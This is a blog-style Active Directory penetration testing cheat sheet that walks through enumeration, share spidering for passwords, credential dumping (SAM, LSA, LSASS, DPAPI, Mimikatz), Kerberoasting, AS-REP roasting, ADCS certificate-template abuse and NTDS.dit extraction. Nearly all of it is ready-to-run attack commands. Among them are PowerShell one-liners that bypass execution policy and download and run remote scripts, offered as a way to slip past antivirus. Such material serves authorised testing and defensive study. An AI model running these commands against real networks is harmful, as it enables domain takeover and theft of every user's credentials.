---
title: Active Directory Pentest Steps
author: asphixie
date: 2023-03-10 20:55:00 +0800
categories: [Active Directory]
pin: true
comments: false
---

Active Directory Pentesting steps.

## Mapping & Enumeration

### Basic Bloodhound

Use BloodHound to find compromission paths. First execute the collector on a host that is in the targeted domain.

```powershell
powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString(‘https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1’);Invoke-BloodHound"
```
{: .nolineno }

If it's possible, execute SharpHound. Otherwise, on Linux, you can use the python version, remotely. More information here : <https://github.com/BloodHoundAD/SharpHound> and <https://github.com/fox-it/BloodHound.py>.

```bash
python3 bloodhound.py -u 'XXX' -dc 'DOMAIN' -c all
```
{: .nolineno }

The tool gives you a .zip file, that you have to send to a Neo4j database. On Linux, install Neo4j and start the service :

```bash
sudo neo4j start
```
{: .nolineno }

Then execute BloodHound and import the zip file.

### Extended Bloodhound (PKI)

Best thing to do is to use Certipy to get a bloodhound extract, including everything about ADCS (templates, etc.) :

```bash
certipy find -bloodhound -u USER@DOMAIN -p 'PASSWORD' -dc-ip DC_IP
```
{: .nolineno }

Then, use Olivier Lyak's bloohound, which includes PKIs stuff (<https://github.com/ly4k/BloodHound>). This will give you the opportunity to check for a lot of knows attacks on ADCS (ESC1 to ESC10).

### Goddi

To get all the important information from the Active Directory :

```bash
./goddi-linux-amd64 -dc IP_DC -domain=DOMAIN -username=USERNAME -password=PASSWORD -unsafe
```
{: .nolineno }

## Shares

Dump all shares via CrackMapExec. This can be used on native Kali distribution :

```bash
crackmapexec smb IP_ADDRESS/MASK -u 'XXX' -p 'XXX' -M spider_plus -o READ_ONLY=false
```
{: .nolineno }

This command create a directory cme_spider_plus in /tmp (for Linux). To retrive passwords, simply use grep, by using keywords like 'password', 'pass', 'username', 'ldap://', etc.

```bash
grep -rnw ./ -e 'password'
```
{: .nolineno }

If detected by AV/EDR, try PowerShell one-liner PowerView :

```powershell
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')"
```
{: .nolineno }

Then, a lot of functionalities can be used. To find all domain shares :

```powershell
Find-DomainShare -CheckShareAccess
```
{: .nolineno }

All the functionalities here : <https://powersploit.readthedocs.io/en/latest/Recon/>

## Dump credentials

### CrackMapExec

Many possibilites. Use --local-auth if using a local admin account.
With lsassy module :

```bash
crackmapexec smb IP_ADDRESS/MASK -d 'DOMAIN'-u 'USER' -p 'PASSWORD' -M lsassy
```
{: .nolineno }

Dump SAM (local hashes) :

```bash
crackmapexec smb IP_ADDRESS/MASK -d 'DOMAIN'-u 'USER' -p 'PASSWORD' --sam
```
{: .nolineno }

Dump LSA secrets :

```bash
crackmapexec smb IP_ADDRESS/MASK -d 'DOMAIN'-u 'USER' -p 'PASSWORD' --lsa
```
{: .nolineno }

Many possibilites here, if you get passwords or NTLM hashes, you know what to do. There's others possibilites too, like authenticating with AES keys (you can use 256 or 128 bits keys). You can get it by dumping LSA secrets. Once you get one, you can use the AES keys with Impacket to do whatever you want, and also get a TGT :

```bash
impacket-getTGT domain.local/username -aesKey AES_KEY -dc-ip DC_IP
```
{: .nolineno }

### DonPAPI

Use DonPAPI to retrieve a lot of credentials (wifi, dpapi keys, browsers passwords, ...) :

```bash
python3 DonPAPI.py DOMAIN/USERNAME:PASSWORD@IP_ADDRESS
```
{: .nolineno }

It's possible to use the tool with Pass-The-Hash :

```bash
python3 DonPAPI.py DOMAIN/USERNAME@IP_ADDRESS --hashes LM:NT
```
{: .nolineno }

If you get a valid admin account, dump the domain backup key. This backup key (.pvk) can then be used to dump all domain user's secrets :

```bash
impacket-dpapi backupkeys --export -t domain.local/username@DC_FQDN -k -no-pass
```
{: .nolineno }

Then, use the domain backup key on all machine, with one command. Extract all FQDN in a file (targets for example) and then :

```bash
python3 DonPAPI.py -pvk pathtofile.pvk domain.local/username@targets -k -no-pass
```
{: .nolineno }

You can parse the output by using this magic one-liner :

```bash
cat DonPapiOutput.txt | grep -ae 'Firefox Password' -e 'Chrome Password' | cut -d : -f 3 | cut -d ' ' -f 2 | sort | uniq >> motdepasse.txt && cat DonPapiOutput.txt | grep -ae '\[mRemoteNG\]' | cut -d : -f 2 | cut -d ' ' -f 1 | sort | uniq >> motdepasse.txt & cat motdepasse.txt | sort | uniq | sed "s,\x1B\[[0-9;]*[a-zA-Z],,g" > motdepasse.txt
```
{: .nolineno }

### Mimikatz

On Windows, retrieve password/hash from a dump file :

```powershell
sekurlsa::minidump "XXXXXXXXX.DMP"
sekurlsa::logonPasswords
```

On Kali, use pypykatz based on python :

```bash
pypykatz lsa minidump 'XXX.DMP'
```
{: .nolineno }

### Others

Native Windows command :

```markdown
rundll32 keymgr.dll, KRShowKeyMgr
```
{: .nolineno }

Savoir : Mimikatz recompiled in Go lang : <https://github.com/vincd/savoir>

## Impersonation

To execute commands with another account :

```powershell
$password = ConvertTo-SecureString 'pasword_of_user_to_run_as' -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential('FQDN.DOMAIN\user_to_run_as', $password)
Invoke-Command -ComputerName Server01 -Credential $credential -ScriptBlock { COMMAND }
```

## Kerberos

### Kerberoast

GetUserSPNs and get hashes :

```bash
impacket-GetUserSPNs -request -dc-ip IP_ADDRESS DOMAIN/USERNAME -outputfile hashes.kerberoast
```
{: .nolineno }

If you get hashes, try to crack it and then use DCSync exploit :

```bash
impacket-secretsdump -just-dc-ntlm DOMAIN/USERNAME:PASSWORD@DC_IP
```
{: .nolineno }

### AS-REP Roasting

Look for users without Kerberos pre-authentication required attribute (using credential, low privilege) :

```bash
impacket-GetNPUsers -dc-ip DC_IP DOMAIN/USERNAME:PASSWORD
```
{: .nolineno }

Get a TGT for a user, whithout his password, if you know that this account have Kerberos pre-auth disabled :

```bash
impacket-GetNPUsers -dc-ip DC_IP DOMAIN/USERNAME -no-pass
```
{: .nolineno }

### Authenticate with Kerberos

If you have a valid username/password, you can ask the KDC for a TGT. It is truly important to use the real domain name and not an alias :

```bash
impacket-getTGT 'domain.local/username:password' -dc-ip DC_IP
```
{: .nolineno }

This command will create a .ccache file, which is your TGT allowing you to authenticate against the KDC. Export it on the KRB5CCNAME variable to use it :

```bash
export KRB5CCNAME=/absolute/path/to/user.ccname
```
{: .nolineno }

Then you can use, for example the impacket collection, with -k and -no-pass options to use kerberos authentication :

```bash
impacket-smbexec domain.local/username@FQDN -k -no-pass
impacket-wmiexec domain.local/username@FQDN -k -no-pass
impacket-psexec domain.local/username@FQDN -k -no-pass
```
{: .nolineno }

With CrackMapExec, use the -k and --use-kcache options to use a kerberos authentication :

```bash
crackmapexec smb IP_ADDRESS/MASK -u 'USERNAME' -k --use-kcache
```
{: .nolineno }

## Active Directory Certificate Services (ADCS)

You can try to find directly vulnerable templates with certipy. Good to use /currentuser option if you only have one valid account :

```bash
certipy find -vulnerable -u USER@DOMAIN -p 'PASSWORD' -dc-ip DC_IP
```
{: .nolineno }

If it doesn't work, you probably have to do it on a domain-joined machine, using Windows.
You can get the compiled tools here : https://github.com/r3motecontrol/Ghostpack-CompiledBinaries

Same thing can be done with Certify.exe :

```powershell
./Certify.exe find /vulnerable /domain:DOMAIN
```
{: .nolineno }

## Misconfigured Certificate Template
If you find a certificate template with those things, the job is almost done :

> -msPKI-Certificates-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT : it means that the user, who is requesting a new certificate based on this certificate template, can request the certificate for another user (like Domain admins)
{: .prompt-info }

> -PkiExtendedKeyUsage: Client Authentication : it means that the certificate that will be generated based on this certificate template can be used to authenticate to computers in Active Directory
{: .prompt-info }

> -Enrollment Rights: NT Authority\Authenticated Users or Domains users : it means that any authenticated user in the Active Directory is allowed to request new certificates to be generated based on this certificate template.
{: .prompt-info }

So, you can firstly ask a certificate for Administrator, using tools like Certify.exe :

```powershell
./Certify.exe request /ca:FQDN\CA-NAME /domain:DOMAIN /template:VULNERABLE-TEMPLATE-NAME /altname:ACCOUNT-TO-IMPERSONATE
```
{: .nolineno }

This will generate a .pem certificate. To use it and ask a TGT, you have to convert it to .pfx format, using openssl :

```bash
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```
{: .nolineno }

Then, use certipy to ask a TGT and get the account NTLM hash :

```bash
certipy auth -pfx cert.pfx -dc-ip DC-IP -u ACCOUNT-TO-IMPERSONATE -domain DOMAIN
```
{: .nolineno }

You then get the NTLM Hash. Enjoy ;)

## NTDS Exfiltration

### Remote extraction using CrackmapExec or Impacket

Once you get domain admin, dump NTDS.dit to get all the hashes from the Active Directory :

```bash
crackmapexec smb IP_ADDRESS/MASK -d 'DOMAIN' -u 'USERNAME' -p 'PASSWORD' --ntds
```
{: .nolineno }

Use with -H option to use NTLM hash :

```bash
crackmapexec smb IP_ADDRESS/MASK -d 'DOMAIN' -u 'USERNAME' -H 'NTLM_HASH' --ntds
```
{: .nolineno }

You can also use Impacket to extract NTDS from the DC :

```bash
impacket-secretsdump domain.local/username@FQDN -k -no-pass
```
{: .nolineno }

Then, extract all the hashes to put them on hashcat.

```bash
cat ntds.dit | cut -d : -f 4 |sort|uniq > hashes.txt
```
{: .nolineno }

### Extract NTDS from a local NTDS.dit file

If you get a local access to the DC, you have to get NTDS.dit and SYSTEM files in order to extract all the informations. These files are located here :

```powershell
%SYSTEMROOT%\NTDS\ntds.dit
%SystemRoot%\System32\config\SYSTEM
```
{: .nolineno }

Once you get these two files, you are able to extract all the informations using impacket. The 'LOCAL' at the end allows you to use local ntds file :

```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```
{: .nolineno }

